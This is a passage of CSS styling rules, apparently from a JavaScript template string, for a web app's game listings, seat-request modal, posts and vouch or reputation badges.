.hgs-body{max-width:1100px;margin:30px auto 0;padding:0 20px;display:grid;grid-template-columns:1fr 320px;gap:24px}
@media (max-width: 900px){.hgs-body{grid-template-columns:1fr}}
.hgs-section{background:rgba(15,23,42,.55);border:1px solid rgba(148,163,184,.12);border-radius:14px;padding:20px;margin-bottom:18px}
.hgs-section h2{font-size:14px;text-transform:uppercase;letter-spacing:1.5px;color:rgba(255,255,255,.55);margin:0 0 14px;font-weight:800}
.hgs-section p{color:rgba(255,255,255,.5);font-size:13px;font-style:italic;line-height:1.55;margin:0;white-space:pre-wrap}
.hgs-empty{color:rgba(255,255,255,.4);text-align:center;padding:20px;font-size:14px}
.hgs-games-list{display:flex;flex-direction:column;gap:10px}
.hgs-game-card{display:flex;align-items:stretch;gap:14px;padding:14px;background:rgba(0,0,0,.25);border:1px solid rgba(148,163,184,.1);border-radius:10px}
.hgs-game-date{flex-shrink:0;width:72px;padding:8px;background:linear-gradient(135deg,#0ea5e9,#0369a1);border-radius:8px;color:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center}
.hgs-game-mon{font-size:11px;text-transform:uppercase;letter-spacing:1px;font-weight:700;opacity:.85}
.hgs-game-day{font-size:24px;font-weight:900;line-height:1}
.hgs-game-dow{font-size:11px;text-transform:uppercase;letter-spacing:.5px;opacity:.85;margin-top:2px}
.hgs-game-body{flex:1;min-width:0}
.hgs-game-body h3{font-size:16px;font-weight:700;margin:0 0 4px}
.hgs-game-meta{font-size:13px;color:rgba(255,255,255,.55);display:flex;gap:6px;flex-wrap:wrap}
.hgs-game-desc{font-size:13px;color:rgba(255,255,255,.5);margin:6px 0 0 !important}
.hgs-game-rsvp{padding:8px 14px;background:rgba(14,165,233,.18);color:#7dd3fc;border:1px solid rgba(14,165,233,.45);border-radius:8px;font-weight:700;font-size:13px;cursor:pointer;align-self:center;flex-shrink:0;transition:background .15s ease,transform .1s ease}
.hgs-game-rsvp:hover{background:rgba(14,165,233,.28);color:#fff}
.hgs-game-rsvp:active{transform:scale(.97)}
.hgs-seat-backdrop{position:fixed;inset:0;background:rgba(5,8,15,.78);backdrop-filter:blur(6px);z-index:200;display:flex;align-items:center;justify-content:center;padding:20px;animation:hgs-seat-fade .15s ease-out}
@keyframes hgs-seat-fade{from{opacity:0}to{opacity:1}}
.hgs-seat-modal{background:linear-gradient(180deg,#152036 0%,#0d1626 100%);border:1px solid rgba(148,163,184,.16);border-radius:16px;padding:24px;max-width:480px;width:100%;color:#fff;box-shadow:0 20px 60px rgba(0,0,0,.5);animation:hgs-seat-rise .18s ease-out}
.hgs-seat-modal-wide{max-width:720px;max-height:92vh;overflow-y:auto;padding:20px}
.hgs-seat-header{display:flex;align-items:flex-start;justify-content:space-between;gap:12px;margin-bottom:16px}
.hgs-seat-close{background:transparent;border:none;color:#94a3b8;font-size:28px;line-height:1;cursor:pointer;padding:0 4px;margin:-4px -4px 0 0}
.hgs-seat-close:hover{color:#fff}
@keyframes hgs-seat-rise{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
.hgs-seat-title{font-size:20px;font-weight:700;margin:0 0 6px !important;color:#fff;line-height:1.3}
.hgs-seat-sub{font-size:13px;color:rgba(255,255,255,.6);margin:0 0 14px !important}
.hgs-seat-body{font-size:14px;color:rgba(255,255,255,.8);margin:0 0 16px !important;line-height:1.5}
.hgs-seat-hint{font-size:13px;color:rgba(255,255,255,.55);margin:0 0 16px !important;line-height:1.5;padding:10px 12px;background:rgba(139,92,246,.08);border-left:3px solid rgba(139,92,246,.5);border-radius:4px}
.hgs-seat-label{display:block;margin-bottom:14px;font-size:13px;color:rgba(255,255,255,.7);font-weight:600}
.hgs-seat-label > span{display:block;margin-bottom:6px}
.hgs-seat-label small{display:block;text-align:right;margin-top:4px;font-size:11px;color:rgba(255,255,255,.4)}
.hgs-seat-textarea{width:100%;box-sizing:border-box;padding:10px 12px;background:rgba(0,0,0,.3);border:1px solid rgba(148,163,184,.18);border-radius:8px;color:#fff;font-family:inherit;font-size:14px;line-height:1.5;resize:vertical;min-height:72px}
.hgs-seat-request{display:flex;flex-direction:column;gap:12px;padding:4px 0 2px}
.hgs-seat-request-lead{margin:0;font-size:15px;font-weight:700;color:#fff;line-height:1.4}
.hgs-seat-request-note{margin:0;font-size:13px;color:rgba(255,255,255,.6);line-height:1.5}
.hgs-seat-request-label{font-size:12px;font-weight:600;color:rgba(255,255,255,.7)}
.hgs-seat-request-input{width:100%;box-sizing:border-box;padding:10px 12px;background:rgba(0,0,0,.3);border:1px solid rgba(148,163,184,.18);border-radius:8px;color:#fff;font-family:inherit;font-size:14px;line-height:1.5;resize:vertical}
.hgs-seat-textarea:focus{outline:none;border-color:rgba(139,92,246,.6);background:rgba(0,0,0,.4)}
.hgs-seat-error{background:rgba(239,68,68,.12);color:#fca5a5;border:1px solid rgba(239,68,68,.3);border-radius:8px;padding:10px 12px;font-size:13px;margin-bottom:12px}
.hgs-seat-summary{margin:0 0 20px;padding:12px 14px;background:rgba(0,0,0,.25);border-radius:8px}
.hgs-seat-summary div{display:flex;justify-content:space-between;padding:6px 0;font-size:13px}
.hgs-seat-summary dt{color:rgba(255,255,255,.5);font-weight:600}
.hgs-seat-summary dd{margin:0;color:#fff;font-weight:600;text-align:right}
.hgs-seat-actions{display:flex;gap:10px;justify-content:flex-end}
.hgs-seat-btn{padding:10px 18px;border-radius:8px;font-weight:700;font-size:14px;cursor:pointer;border:1px solid transparent;transition:background .15s ease,transform .1s ease}
.hgs-seat-btn:active{transform:scale(.97)}
.hgs-seat-btn:disabled{opacity:.5;cursor:not-allowed}
.hgs-seat-btn-ghost{background:transparent;color:rgba(255,255,255,.65);border-color:rgba(148,163,184,.2)}
.hgs-seat-btn-ghost:hover:not(:disabled){background:rgba(255,255,255,.06);color:#fff}
.hgs-seat-btn-primary{background:linear-gradient(180deg,#0ea5e9 0%,#0284c7 100%);color:#fff;box-shadow:0 4px 14px rgba(14,165,233,.4)}
.hgs-seat-btn-primary:hover:not(:disabled){background:linear-gradient(180deg,#38bdf8 0%,#0ea5e9 100%)}
.hgs-posts{display:flex;flex-direction:column;gap:12px}
.hgs-post{background:rgba(0,0,0,.2);border:1px solid rgba(148,163,184,.08);border-radius:10px;padding:14px}
.hgs-post header{display:flex;gap:8px;align-items:center;margin-bottom:8px;font-size:13px;color:rgba(255,255,255,.6)}
.hgs-post header strong{color:#fff;font-size:14px;font-weight:700}
.hgs-post-pin{background:rgba(14,165,233,.15);color:#38bdf8;padding:2px 8px;border-radius:10px;font-size:11px;font-weight:700;margin-left:auto}
.hgs-post p{margin:0 !important;color:rgba(255,255,255,.8) !important}
.hgs-post footer{margin-top:8px;font-size:12px;color:rgba(255,255,255,.4);display:flex;gap:6px}
.hgs-kv{margin:0;padding:0}
.hgs-kv div{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px dashed rgba(148,163,184,.08);font-size:13px}
.hgs-kv div:last-child{border-bottom:none}
.hgs-kv dt{color:rgba(255,255,255,.5);font-weight:600}
.hgs-kv dd{margin:0;color:#fff;font-weight:600;text-align:right}
.hgs-card{padding:18px}
.hgs-share-url{font-size:12px;color:rgba(255,255,255,.5);word-break:break-all;background:rgba(0,0,0,.3);padding:8px 10px;border-radius:6px;margin-bottom:8px;font-family:monospace}
.hgs-footer-link{text-align:center;padding:20px 0;font-size:13px}
.hgs-back-btn{background:transparent;border:none;color:rgba(14,165,233,.8);font-size:13px;font-weight:600;cursor:pointer;padding:0;text-decoration:none}
.hgs-back-btn:hover{color:#38bdf8}
/* ── Vouch & Reputation ── */
.hgs-vouch-count-btn{display:inline-flex;align-items:center;gap:5px;background:rgba(34,211,238,.08);border:1px solid rgba(34,211,238,.2);border-radius:20px;color:#22d3ee;font-size:12px;font-weight:600;cursor:pointer;padding:3px 10px;transition:all .15s;white-space:nowrap}
.hgs-vouch-count-btn:hover{background:rgba(34,211,238,.18);border-color:rgba(34,211,238,.5)}
.hgs-vouch-count-btn strong{color:#fff;font-weight:700}
.hgs-rep-badge{display:inline-flex;align-items:center;gap:5px;border-radius:20px;padding:4px 10px;font-size:12px;font-weight:700;margin-top:8px;letter-spacing:.3px}
.hgs-vouch-btn{padding:10px 16px;background:rgba(34,211,238,.1);color:#22d3ee;border:1.5px solid rgba(34,211,238,.35);border-radius:8px;font-size:13px;font-weight:800;letter-spacing:.3px;cursor:pointer;transition:all .15s;display:inline-flex;align-items:center;gap:6px}
.hgs-vouch-btn:hover:not(:disabled){background:rgba(34,211,238,.2);border-color:rgba(34,211,238,.6)}
.hgs-vouch-btn:disabled{opacity:.5;cursor:not-allowed}
.hgs-vouch-btn-on{background:rgba(34,211,238,.22);color:#fff;border-color:#22d3ee;box-shadow:0 0 12px rgba(34,211,238,.2)}
/* ── Vouchers Modal ── */
.hgs-vouchers-modal{background:linear-gradient(180deg,#152036 0%,#0d1626 100%);border:1px solid rgba(148,163,184,.16);border-radius:16px;padding:24px;max-width:440px;width:100%;color:#fff;box-shadow:0 20px 60px rgba(0,0,0,.5);animation:hgs-seat-rise .18s ease-out;max-height:85vh;overflow-y:auto}
.hgs-vouchers-list{display:flex;flex-direction:column;gap:10px;max-height:340px;overflow-y:auto}
.hgs-voucher-row{display:flex;align-items:center;gap:12px;padding:10px 12px;background:rgba(255,255,255,.04);border-radius:10px;border:1px solid rgba(148,163,184,.08)}
.hgs-voucher-avatar{width:40px;height:40px;border-radius:50%;background:#1e293b;border:2px solid rgba(34,211,238,.3);overflow:hidden;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:16px;font-weight:700;color:#22d3ee}
.hgs-voucher-avatar img{width:100%;height:100%;object-fit:cover}
.hgs-voucher-info{flex:1;min-width:0}
.hgs-voucher-info strong{display:block;font-size:14px;font-weight:700;color:#fff;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.hgs-voucher-info span{display:block;font-size:12px;color:rgba(255,255,255,.4);margin-top:2px}
.hgs-voucher-check{flex-shrink:0;width:28px;height:28px;background:rgba(34,211,238,.1);border-radius:50%;display:flex;align-items:center;justify-content:center}
`;
